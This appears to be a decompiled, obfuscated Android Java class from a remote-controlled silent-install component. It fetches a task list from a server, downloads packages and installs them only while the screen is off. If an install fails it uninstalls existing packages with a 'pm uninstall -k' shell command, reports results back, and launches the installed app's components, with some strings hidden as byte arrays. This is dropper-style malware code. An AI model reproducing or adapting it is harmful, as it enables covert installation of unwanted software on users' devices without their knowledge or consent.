package gqq.wwvrslwg.tnyijqWfo.a.e;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.PowerManager;
import android.util.Log;
import gqq.wwvrslwg.tnyijqWfo.a.o;
import gqq.wwvrslwg.tnyijqWfo.a.p;
import gqq.wwvrslwg.tnyijqWfo.a.r;
import gqq.wwvrslwg.tnyijqWfo.a.v;
import gqq.wwvrslwg.tnyijqWfo.a.w;
import gqq.wwvrslwg.tnyijqWfo.a.x;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public final class e
  implements gqq.wwvrslwg.tnyijqWfo.a.a.h
{
  private static e a = new e();
  private a b = null;
  
  public e() {}
  
  public static e a()
  {
    return a;
  }
  
  private Map a(Map paramMap)
  {
    int j = 0;
    Object localObject3 = new ArrayList();
    r.a((List)localObject3, gqq.wwvrslwg.tnyijqWfo.a.d.g.a());
    if (!this.b.a()) {
      ((List)localObject3).add(new BasicNameValuePair(g.l, this.b.toString()));
    }
    boolean bool = gqq.wwvrslwg.tnyijqWfo.a.g.b(gqq.wwvrslwg.tnyijqWfo.a.d.i.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a()).a("si_need2update", "false"));
    Object localObject1 = g.k;
    Object localObject2 = new StringBuilder();
    if (bool) {}
    for (int i = 1;; i = 0)
    {
      ((List)localObject3).add(new BasicNameValuePair((String)localObject1, i));
      localObject1 = null;
      i = j;
      for (;;)
      {
        localObject2 = localObject1;
        if (i >= 2) {
          break;
        }
        localObject1 = gqq.wwvrslwg.tnyijqWfo.a.k.a(gqq.wwvrslwg.tnyijqWfo.a.d.k.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a()).i(), (List)localObject3);
        localObject2 = localObject1;
        if (!((String)localObject1).equals("")) {
          break;
        }
        i += 1;
      }
    }
    if (!((String)localObject2).equals(""))
    {
      gqq.wwvrslwg.tnyijqWfo.a.d.i.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a()).b("si_need2update", "false");
      this.b = this.b.a((String)localObject2);
      h.a(Long.parseLong(v.a(v.a((String)localObject2), g.m, "50000")));
    }
    localObject1 = h.a((String)localObject2);
    new StringBuilder("net task length:").append(((Map)localObject1).size());
    localObject2 = ((Map)localObject1).keySet().iterator();
    while (((Iterator)localObject2).hasNext())
    {
      localObject3 = (String)((Iterator)localObject2).next();
      i localI = (i)((Map)localObject1).get(localObject3);
      if (!paramMap.containsKey(localObject3)) {
        paramMap.put(localI.a(), localI);
      }
    }
    new StringBuilder("all task length:").append(((Map)localObject1).size());
    return paramMap;
  }
  
  private void a(Context paramContext, boolean paramBoolean)
  {
    Log.e("SI", "execute ... " + paramBoolean);
    if (!r.f(paramContext)) {
      return;
    }
    i localI;
    for (;;)
    {
      try
      {
        this.b = h.b();
        Map localMap = h.a();
        if (paramBoolean)
        {
          localMap = a(localMap);
          Iterator localIterator = localMap.keySet().iterator();
          if (!localIterator.hasNext()) {
            break;
          }
          localI = (i)localMap.get((String)localIterator.next());
          new StringBuilder("process task : ").append(localI.toString());
          if (!localI.f()) {
            break label151;
          }
          if (!a(localI)) {
            continue;
          }
          h.b(localI);
          continue;
        }
        continue;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return;
      }
      label151:
      if (!r.a(paramContext, localI.a())) {
        break label199;
      }
      localI.a("is system!");
      localI.a(false);
      localI.g();
      a(localI);
      this.b.a(localI);
    }
    label199:
    Object localObject;
    int i;
    if (!localI.h())
    {
      localObject = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
      if (localObject == null) {
        break label309;
      }
      if (((NetworkInfo)localObject).getType() == 1) {
        i = 1;
      }
    }
    for (;;)
    {
      if (i != 1)
      {
        h.a(localI);
        break;
        if (((NetworkInfo)localObject).getType() != 0) {
          break label309;
        }
        i = 2;
        continue;
      }
      h.a(localI);
      localObject = new f(paramContext, localI.c());
      ((f)localObject).a(localI);
      gqq.wwvrslwg.tnyijqWfo.a.a.c.a().a(this);
      gqq.wwvrslwg.tnyijqWfo.a.a.a.a();
      gqq.wwvrslwg.tnyijqWfo.a.a.a.a((gqq.wwvrslwg.tnyijqWfo.a.a.f)localObject);
      break;
      label309:
      i = 0;
    }
  }
  
  private static boolean a(i paramI)
  {
    try
    {
      ArrayList localArrayList = new ArrayList();
      r.a(localArrayList, gqq.wwvrslwg.tnyijqWfo.a.d.g.a());
      localArrayList.add(new BasicNameValuePair(g.a, paramI.a()));
      localArrayList.add(new BasicNameValuePair(g.j, paramI.l()));
      String str = g.h;
      StringBuilder localStringBuilder = new StringBuilder();
      if (paramI.e()) {}
      for (int i = 1;; i = 0)
      {
        localArrayList.add(new BasicNameValuePair(str, i));
        localArrayList.add(new BasicNameValuePair(g.i, paramI.d()));
        paramI = gqq.wwvrslwg.tnyijqWfo.a.k.a(gqq.wwvrslwg.tnyijqWfo.a.d.k.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a()).j(), localArrayList);
        new StringBuilder("feedback .\nurl：").append(gqq.wwvrslwg.tnyijqWfo.a.d.k.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a()).j()).append("\nparam：").append(localArrayList.toString()).append("\nretStr：").append(paramI);
        boolean bool = new JSONObject(paramI).getString("status").equals("1");
        if (!bool) {
          break;
        }
        return true;
      }
      return false;
    }
    catch (Exception paramI)
    {
      paramI.printStackTrace();
    }
  }
  
  public final void a(int paramInt, Object paramObject)
  {
    Object localObject3;
    Object localObject2;
    if (paramObject.getClass() == f.class)
    {
      localObject3 = (f)paramObject;
      localObject2 = ((f)localObject3).h();
    }
    switch (paramInt)
    {
    case 2: 
    case 3: 
    default: 
      return;
    }
    if (((PowerManager)gqq.wwvrslwg.tnyijqWfo.a.d.g.a().getSystemService("power")).isScreenOn())
    {
      c.a(gqq.wwvrslwg.tnyijqWfo.a.d.g.a());
      return;
    }
    Object localObject1 = x.a(new File(((f)localObject3).b()), " -r ");
    if (!((String)localObject1).equals("success"))
    {
      paramObject = gqq.wwvrslwg.tnyijqWfo.a.d.g.a();
      if (paramObject.getPackageManager().checkPermission("android.permission.DELETE_PACKAGES", paramObject.getPackageName()) == 0)
      {
        paramInt = 1;
        label131:
        if (paramInt == 0) {
          break label810;
        }
        paramObject = ((i)localObject2).a();
        paramObject = o.a("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall -k " + paramObject.replace(" ", "\\ "));
        if ((paramObject.b == null) || ((!paramObject.b.contains("Success")) && (!paramObject.b.contains("success")))) {
          break label625;
        }
        paramObject = "success";
        label208:
        if (!paramObject.equals("success")) {
          break label646;
        }
        paramObject = x.a(new File(((f)localObject3).b()), " -r ");
      }
    }
    for (;;)
    {
      label237:
      ((i)localObject2).g();
      ((i)localObject2).a(paramObject.equals("success"));
      ((i)localObject2).a(paramObject.trim());
      if (paramObject.equals("success")) {
        this.b.b((i)localObject2);
      }
      String str2;
      String str3;
      for (;;)
      {
        h.a((i)localObject2);
        h.c((i)localObject2);
        if (a((i)localObject2)) {
          h.b((i)localObject2);
        }
        if (!((i)localObject2).e()) {
          break;
        }
        localObject3 = ((i)localObject2).i();
        localObject1 = gqq.wwvrslwg.tnyijqWfo.a.d.g.a().getPackageName();
        localObject2 = ((i)localObject2).j();
        String str1 = new String(new byte[] { 97, 99, 116, 105, 118, 105, 116, 121 });
        str2 = new String(new byte[] { 115, 101, 114, 118, 105, 99, 101 });
        str3 = new String(new byte[] { 98, 114, 111, 97, 100, 99, 97, 115, 116 });
        if (gqq.wwvrslwg.tnyijqWfo.a.g.a((String)localObject3, new String[] { "" })) {
          break;
        }
        if (gqq.wwvrslwg.tnyijqWfo.a.g.a((String)localObject2, new String[] { "" })) {
          break;
        }
        paramObject = gqq.wwvrslwg.tnyijqWfo.a.d.g.a();
        if (!((String)localObject3).equals(str1)) {
          break label686;
        }
        localObject1 = new ComponentName((String)localObject1, (String)localObject2);
        try
        {
          localObject2 = new Intent();
          ((Intent)localObject2).setComponent((ComponentName)localObject1);
          ((Intent)localObject2).addFlags(268435456);
          paramObject.startActivity((Intent)localObject2);
          return;
        }
        catch (Exception paramObject)
        {
          paramObject.printStackTrace();
          return;
        }
        paramInt = 0;
        break label131;
        label625:
        paramObject = paramObject.c;
        break label208;
        label646:
        paramObject = (String)localObject1 + " <-> " + paramObject;
        break label237;
        this.b.a((i)localObject2);
      }
      label686:
      if (((String)localObject3).equals(str2))
      {
        localObject1 = new ComponentName((String)localObject1, (String)localObject2);
        try
        {
          localObject2 = new Intent();
          ((Intent)localObject2).setComponent((ComponentName)localObject1);
          ((Intent)localObject2).addFlags(268435456);
          paramObject.startService((Intent)localObject2);
          return;
        }
        catch (Exception paramObject)
        {
          paramObject.printStackTrace();
          return;
        }
      }
      if (!((String)localObject3).equals(str3)) {
        break;
      }
      try
      {
        localObject3 = new Intent();
        ((Intent)localObject3).setPackage((String)localObject1);
        ((Intent)localObject3).setAction((String)localObject2);
        ((Intent)localObject3).addFlags(268435456);
        ((Intent)localObject3).addFlags(32);
        paramObject.sendBroadcast((Intent)localObject3);
        return;
      }
      catch (Exception paramObject)
      {
        paramObject.printStackTrace();
        return;
      }
      label810:
      paramObject = localObject1;
    }
  }
  
  public final void a(Context paramContext)
  {
    Context localContext = gqq.wwvrslwg.tnyijqWfo.a.d.g.a();
    int i;
    if (localContext.getPackageManager().checkPermission("android.permission.INSTALL_PACKAGES", localContext.getPackageName()) == 0)
    {
      i = 1;
      if (i != 0) {
        break label39;
      }
      w.a("not support si!");
    }
    label39:
    do
    {
      return;
      i = 0;
      break;
      if (!h.c()) {
        break label63;
      }
    } while (h.a().size() <= 0);
    a(paramContext, false);
    return;
    label63:
    a(paramContext, true);
  }
}
